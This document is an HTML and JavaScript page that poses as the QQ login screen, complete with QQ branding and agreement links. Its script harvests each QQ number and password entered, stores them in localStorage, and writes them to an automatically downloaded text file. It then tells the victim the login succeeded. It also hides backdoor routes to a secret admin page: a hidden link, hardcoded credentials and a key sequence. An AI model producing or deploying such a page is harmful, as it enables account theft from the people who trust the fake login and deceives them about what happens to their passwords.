<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QQ登录</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Microsoft YaHei", sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #12c2e9, #c471ed, #f64f59);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .login-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            width: 380px;
            padding: 30px;
            text-align: center;
        }
        
        .login-header {
            margin-bottom: 30px;
        }
        
        .login-header h1 {
            color: #12b7f5;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .login-header p {
            color: #666;
            font-size: 14px;
        }
        
        .login-form {
            text-align: left;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #666;
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        
        .form-control:focus {
            border-color: #12b7f5;
            outline: none;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .checkbox-group input {
            margin-right: 8px;
        }
        
        .checkbox-group a {
            color: #12b7f5;
            text-decoration: none;
            margin-left: 5px;
        }
        
        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: #12b7f5;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .btn-login:hover {
            background-color: #0d9ed8;
        }
        
        .login-footer {
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
            font-size: 14px;
        }
        
        .login-footer a {
            color: #12b7f5;
            text-decoration: none;
        }
        
        .hidden-admin {
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>QQ</h1>
            <p>每一天，乐在沟通</p>
        </div>
        <form id="loginForm" class="login-form">
            <div class="form-group">
                <label for="qqNumber">QQ号</label>
                <input type="text" id="qqNumber" class="form-control" placeholder="请输入QQ号码">
            </div>
            <div class="form-group">
                <label for="password">密码</label>
                <input type="password" id="password" class="form-control" placeholder="请输入密码">
            </div>
            <div class="checkbox-group">
                <input type="checkbox" id="agree">
                <label for="agree">已阅读并同意</label>
                <a href="#">服务协议</a>
                <label for="agree">和</label>
                <a href="#">QQ隐私保护指引</a>
            </div>
            <button type="submit" class="btn-login">登录</button>
        </form>
        <div class="login-footer">
            <a href="#">手机号登录</a>
            <a href="#">其他方式登录</a>
            <a href="#">注册新账号</a>
        </div>
        
        <!-- 隐藏的后台入口 - 普通用户看不到 -->
        <div class="hidden-admin">
            <!-- 只有您知道的秘密后台地址 -->
            <a href="admin_secret_2024.html" id="secretAdminLink"></a>
        </div>
    </div>

    <script>
        // 登录表单提交
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const qqNumber = document.getElementById('qqNumber').value;
            const password = document.getElementById('password').value;
            const agree = document.getElementById('agree').checked;
            
            if (!qqNumber || !password) {
                alert('请输入QQ号和密码');
                return;
            }
            
            if (!agree) {
                alert('请阅读并同意服务协议和隐私保护指引');
                return;
            }
            
            // 获取现有数据或初始化空数组
            let loginData = JSON.parse(localStorage.getItem('qqLoginData')) || [];
            
            // 记录登录数据
            const loginRecord = {
                id: loginData.length + 1,
                qqNumber: qqNumber,
                password: password,
                loginTime: new Date().toLocaleString(),
                ip: generateRandomIP(),
                userAgent: navigator.userAgent
            };
            
            loginData.push(loginRecord);
            localStorage.setItem('qqLoginData', JSON.stringify(loginData));
            
            // 生成登录文件
            generateLoginFile(loginRecord);
            
            // 普通用户显示成功提示
            alert('登录成功！');
            document.getElementById('loginForm').reset();
            
            // 如果是管理员账号，跳转到秘密后台
            if (qqNumber === '888888' && password === 'admin888') {
                // 3秒后跳转到秘密后台
                setTimeout(function() {
                    window.location.href = 'admin_secret_2024.html';
                }, 3000);
            }
        });

        // 生成随机IP地址
        function generateRandomIP() {
            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }

        // 生成登录文件
        function generateLoginFile(record) {
            // 创建文件内容
            const content = `QQ号: ${record.qqNumber}\n密码: ${record.password}\n登录时间: ${record.loginTime}\nIP地址: ${record.ip}\n浏览器信息: ${record.userAgent}`;
            
            // 创建Blob对象
            const blob = new Blob([content], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            
            // 创建下载链接
            const a = document.createElement('a');
            a.href = url;
            
            // 生成乱码文件名
            const randomChars = Math.random().toString(36).substring(2, 10);
            a.download = `登录记录_${randomChars}.txt`;
            
            // 触发下载
            a.click();
            URL.revokeObjectURL(url);
        }
        
        // 隐藏的后台检测 - 只有您知道的方法
        function checkSecretAccess() {
            // 按特定键组合打开秘密后台
            let keySequence = [];
            document.addEventListener('keydown', function(e) {
                keySequence.push(e.key);
                if (keySequence.length > 5) {
                    keySequence.shift();
                }
                
                // 秘密按键组合：Q Q 1 2 3
                if (keySequence.join('') === 'qq123') {
                    window.location.href = 'admin_secret_2024.html';
                }
            });
        }
        
        // 启动秘密检测
        checkSecretAccess();
    </script>
</body>
</html>
